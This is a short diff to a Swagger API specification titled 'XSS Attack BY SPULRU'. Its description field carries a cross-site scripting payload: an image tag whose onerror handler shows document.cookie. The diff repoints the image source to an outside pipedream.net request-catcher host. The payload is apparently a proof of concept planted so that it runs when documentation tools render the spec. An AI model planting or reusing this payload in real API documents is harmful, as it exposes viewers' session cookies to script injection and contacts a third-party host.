@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
   description: |
-    <img onerror='alert(document.cookie)' src='//kats.skbkontur.ru'>
+    <img onerror='alert(document.cookie)' src='//eoi2i9weyohgx6b.m.pipedream.net'>
   version: production
 basePath: /JSSResource/
 produces:
